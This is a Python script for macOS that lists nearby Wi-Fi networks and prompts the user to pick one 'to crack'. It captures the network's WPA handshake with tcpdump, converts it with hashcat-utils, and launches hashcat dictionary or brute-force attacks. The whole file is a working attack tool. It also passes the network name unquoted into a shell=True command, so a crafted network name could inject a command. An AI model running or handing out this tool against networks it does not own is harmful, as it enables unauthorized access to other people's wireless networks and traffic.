import subprocess
import time
import argparse
from prettytable import PrettyTable
from tabulate import tabulate
from os.path import expanduser

airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'

parser = argparse.ArgumentParser()
parser.add_argument('-w')
parser.add_argument('-m')
parser.add_argument('-i')
args = parser.parse_args()


def scan_networks():
    scan = subprocess.run([airport, '-s'], stdout=subprocess.PIPE)
    scan = scan.stdout.decode('utf-8')
    scan = scan.split('\n')
    count = len(scan) - 1
    scan = [o.split() for o in scan]

    list = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel'])
    networks = {}
    for i in range(1, count):
        network = {}
        network['ssid'] = scan[i][0]
        network['bssid'] = scan[i][1]
        network['rssi'] = scan[i][2]
        network['channel'] = scan[i][3].split(',')[0]

        networks[i] = network

        list.add_row([i, network['ssid'], network['bssid'], network['rssi'], network['channel']])

    print(list)

    x = int(input('\nSelect a network to crack: '))
    capture_network(networks[x]['bssid'], networks[x]['ssid'], networks[x]['channel'])


def capture_network(bssid, ssid, channel):
    subprocess.run(['sudo', airport, '-z'])
    subprocess.run(['sudo', airport, '-c' + channel])

    iface = args.i
    if args.i is None:
        iface = subprocess.run(['networksetup', '-listallhardwareports'], stdout=subprocess.PIPE)
        iface = iface.stdout.decode('utf-8').split('\n')
        iface = iface[iface.index('Hardware Port: Wi-Fi') + 1].split(': ')[1]

    subprocess.run(['sudo', 'tcpdump', 'type mgt subtype beacon and ether src ' + bssid, '-I', '-c', '1', '-i', iface, '-w', 'beacon.cap'], stderr=subprocess.PIPE)
    print('\nCaptured beacon frame...')

    handshake = subprocess.Popen(['sudo', 'tcpdump', 'ether proto 0x888e and ether host ' + bssid, '-I', '-U', '-i', 'en0', '-w', 'handshake.cap'], stderr=subprocess.PIPE)
    print('\nWaiting for handshake...')
    time.sleep(2)

    convert = '0'
    while convert == '0':
        subprocess.run(['mergecap', '-a', '-F', 'pcap', '-w', 'capture.cap', 'beacon.cap', 'handshake.cap'], stderr=subprocess.PIPE)
        convert = subprocess.run([expanduser("~") + '/hashcat-utils/src/cap2hccapx.bin capture.cap capture.hccapx ' + '"' + ssid + '"'], shell=True, stdout=subprocess.PIPE)
        convert = convert.stdout.decode('utf-8').replace('Written', ' Written').split(' ')
        convert = convert[convert.index('Written') + 1]
        time.sleep(1)

    subprocess.run(['sudo', 'kill', str(handshake.pid)])
    print('\nHandshake captured!\n')
    crack_capture()


def crack_capture():
    method = args.m
    if args.m is None:
        print(tabulate([[1, 'Dictionary'], [2, 'Brute-force']], headers=['Number', 'Mode']))
        method = int(input('\nSelect an attack mode: '))

    wordlist = args.w
    if method == 1 and args.w is None:
        wordlist = input('\nInput a wordlist path: ')

    if method == 1:
        subprocess.run(['hashcat', '-m', '2500', 'capture.hccapx', wordlist])
    elif method == 2:
        pattern = input('\nInput a brute-force pattern: ')
        subprocess.run(['hashcat', '-m', '2500', '-a', '3', 'capture.hccapx', pattern])


scan_networks()
